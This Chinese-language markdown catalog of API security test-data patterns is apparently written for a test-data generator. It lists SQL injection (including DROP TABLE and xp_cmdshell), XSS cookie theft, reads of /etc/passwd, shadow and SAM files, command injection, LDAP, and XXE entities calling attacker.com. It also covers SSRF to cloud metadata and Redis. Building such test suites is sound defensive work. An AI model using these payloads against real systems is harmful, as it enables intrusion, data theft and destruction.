# 安全测试数据模式库

本文档定义了接口安全测试数据的生成模式，用于 `testdata_generator.py` 的安全与幂等数据构造。

---

## 1. SQL 注入模式

### 1.1 通用 SQL 注入

| 编号 | 注入内容 | 预期效果 | 适用数据库 |
|------|---------|---------|-----------|
| SQL-001 | `' OR '1'='1` | 绕过登录验证 | MySQL/PostgreSQL/通用 |
| SQL-002 | `' OR '1'='1' --` | 注释掉后续条件 | MySQL/PostgreSQL/通用 |
| SQL-003 | `" OR "1"="1` | 双引号变体 | 通用 |
| SQL-004 | `1' OR '1'='1` | 数字字段注入 | 通用 |
| SQL-005 | `'; DROP TABLE users;--` | 删表攻击 | MySQL/PostgreSQL |
| SQL-006 | `1' UNION SELECT * FROM users--` | 联合查询 | MySQL/PostgreSQL |
| SQL-007 | `1; EXEC xp_cmdshell('dir')--` | 执行系统命令 | SQLServer |
| SQL-008 | `' AND 1=1--` | 布尔盲注 | 通用 |
| SQL-009 | `' AND 1=2--` | 布尔盲注 | 通用 |
| SQL-010 | `' WAITFOR DELAY '0:0:5'--` | 时间盲注 | SQLServer |
| SQL-011 | `' AND SLEEP(5)--` | 时间盲注 | MySQL |
| SQL-012 | `1 OR 1=1` | 无引号注入 | 通用 |

### 1.2 编码绕过

| 编号 | 注入内容 | 绕过方式 |
|------|---------|---------|
| SQL-013 | `%27%20OR%20%271%27%3D%271` | URL 编码 |
| SQL-014 | `&#39; OR &#39;1&#39;=&#39;1` | HTML 实体编码 |
| SQL-015 | `\x27 OR \x271\x27=\x271` | 十六进制编码 |
| SQL-016 | `UNI/**/ON SEL/**/ECT` | 内联注释绕过 |

---

## 2. XSS 攻击模式

### 2.1 反射型 XSS

| 编号 | 注入内容 | 说明 |
|------|---------|------|
| XSS-001 | `<script>alert('XSS')</script>` | 基础 script 标签 |
| XSS-002 | `<script>alert(document.cookie)</script>` | 窃取 Cookie |
| XSS-003 | `<img src=x onerror=alert(1)>` | img 标签 |
| XSS-004 | `<svg/onload=alert(1)>` | SVG 标签 |
| XSS-005 | `<body onload=alert(1)>` | body 标签 |
| XSS-006 | `<input onfocus=alert(1) autofocus>` | input 标签 |
| XSS-007 | `<marquee onstart=alert(1)>` | marquee 标签 |
| XSS-008 | `<details open ontoggle=alert(1)>` | details 标签 |

### 2.2 绕过过滤

| 编号 | 注入内容 | 绕过方式 |
|------|---------|---------|
| XSS-009 | `<ScRiPt>alert(1)</ScRiPt>` | 大小写混淆 |
| XSS-010 | `<script>alert(1)</script>` | Unicode 编码 |
| XSS-011 | `javascript:alert(1)` | javascript 协议 |
| XSS-012 | `<a href="javascript:alert(1)">click</a>` | a 标签 |
| XSS-013 | `"><script>alert(1)</script>` | 闭合属性 |
| XSS-014 | `'><script>alert(1)</script>` | 闭合单引号 |
| XSS-015 | `<script>eval(atob('YWxlcnQoMSk='))</script>` | Base64 编码 |

---

## 3. 路径穿越模式

| 编号 | 注入内容 | 目标 |
|------|---------|------|
| PATH-001 | `../../etc/passwd` | Linux 密码文件 |
| PATH-002 | `../../etc/shadow` | Linux 影子密码 |
| PATH-003 | `..\..\windows\system32\config\sam` | Windows SAM 文件 |
| PATH-004 | `../../../proc/self/environ` | Linux 环境变量 |
| PATH-005 | `....//....//....//etc/passwd` | 双点绕过 |
| PATH-006 | `..%2F..%2F..%2Fetc%2Fpasswd` | URL 编码绕过 |
| PATH-007 | `..%252F..%252Fetc%252Fpasswd` | 双重编码绕过 |
| PATH-008 | `/var/log/../../etc/passwd` | 绝对路径前缀 |

---

## 4. 命令注入模式

| 编号 | 注入内容 | 操作系统 |
|------|---------|---------|
| CMD-001 | `; ls -la` | Linux |
| CMD-002 | `| cat /etc/passwd` | Linux |
| CMD-003 | `$(whoami)` | Linux |
| CMD-004 | `` `id` `` | Linux |
| CMD-005 | `& dir` | Windows |
| CMD-006 | `| ipconfig` | Windows |
| CMD-007 | `&& cat /etc/hosts` | Linux |
| CMD-008 | `\n/bin/ls` | Linux（换行符） |
| CMD-009 | `%0als` | URL 编码换行 |
| CMD-010 | `; sleep 5` | 时间检测 |

---

## 5. LDAP 注入模式

| 编号 | 注入内容 | 说明 |
|------|---------|------|
| LDAP-001 | `*)(|(cn=*))` | 返回所有条目 |
| LDAP-002 | `admin)(&))` | 绕过认证 |
| LDAP-003 | `*)(uid=*))(|(uid=*` | 盲注提取 |
| LDAP-004 | `*)((|userPassword=*)` | 提取密码 |

---

## 6. XML / XXE 注入模式

| 编号 | 注入内容 | 说明 |
|------|---------|------|
| XXE-001 | `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>` | 文件读取 |
| XXE-002 | `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil">]><foo>&xxe;</foo>` | SSRF |
| XXE-003 | `<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]>` | 参数实体 |
| XXE-004 | `<![CDATA[<script>alert(1)</script>]]>` | CDATA 注入 |

---

## 7. SSRF 注入模式

| 编号 | 注入内容 | 目标 |
|------|---------|------|
| SSRF-001 | `http://127.0.0.1:8080/admin` | 本地管理接口 |
| SSRF-002 | `http://169.254.169.254/latest/meta-data/` | AWS 元数据 |
| SSRF-003 | `http://localhost/etc/passwd` | 本地文件 |
| SSRF-004 | `http://0x7f000001:8080/` | 十六进制 IP |
| SSRF-005 | `http://[::1]:8080/` | IPv6 本地 |
| SSRF-006 | `gopher://127.0.0.1:6379/_*1%0d%0a` | Redis 协议 |

---

## 8. 幂等性测试模式

| 编号 | 场景 | 测试策略 | 适用接口 |
|------|------|---------|---------|
| IDEM-001 | 重复提交 | 同一请求连续发送2次 | POST 创建类接口 |
| IDEM-002 | 并发创建 | 同一请求并发发送5次 | POST 创建类接口 |
| IDEM-003 | 重复支付 | 同一支付请求发送2次 | POST 支付接口 |
| IDEM-004 | 重复删除 | 同一删除请求发送2次 | DELETE 接口 |
| IDEM-005 | 重复更新 | 同一更新请求发送2次 | PUT 接口 |

### 预期结果

| 接口类型 | 重复提交预期 | 并发创建预期 |
|---------|------------|------------|
| 幂等接口 | 第二次返回相同结果 | 只有1条数据被创建 |
| 非幂等接口 | 第二次创建新资源 | 可能创建多条数据 |
| 支付接口 | 第二次返回"已支付" | 只扣款1次 |
| 删除接口 | 第二次返回 404 | 正常删除1次 |

---

## 9. 大数据量测试模式

| 编号 | 场景 | 数据规模 | 适用类型 |
|------|------|---------|---------|
| BIG-001 | 超长字符串 | 10000 字符 | string 参数 |
| BIG-002 | 超大数值 | 999999999999 | integer/number 参数 |
| BIG-003 | 大数组 | 1000 个元素 | array 参数 |
| BIG-004 | 深层嵌套 | 10 层嵌套对象 | object 参数 |
| BIG-005 | 大量参数 | 100 个额外属性 | object 参数 |
| BIG-006 | 大文件上传 | 100MB 文件 | file 参数 |

---

## 10. 安全数据使用规范

### 10.1 标注规则

每条安全测试数据必须标注：

```yaml
- case_id: "SEC_001"
  name: "SQL注入-用户名"
  category: "security"
  security_type: "sql_injection"     # 安全类型
  attack_vector: "SQL-001"           # 攻击向量编号
  risk_level: "high"                  # 风险等级：high/medium/low
  priority: "P1"
```

### 10.2 风险等级

| 安全类型 | 风险等级 |
|---------|---------|
| SQL 注入 | high |
| XSS | high |
| 命令注入 | high |
| 路径穿越 | medium |
| SSRF | high |
| LDAP 注入 | medium |
| XXE | high |
| 重复提交 | low |
| 大数据量 | low |

### 10.3 免责声明

所有安全测试数据仅用于测试目的，不可用于真实攻击。测试时应确保：
- 在隔离的测试环境中执行
- 不在生产环境使用
- 遵守公司安全测试规范
- 获得授权后方可进行安全测试
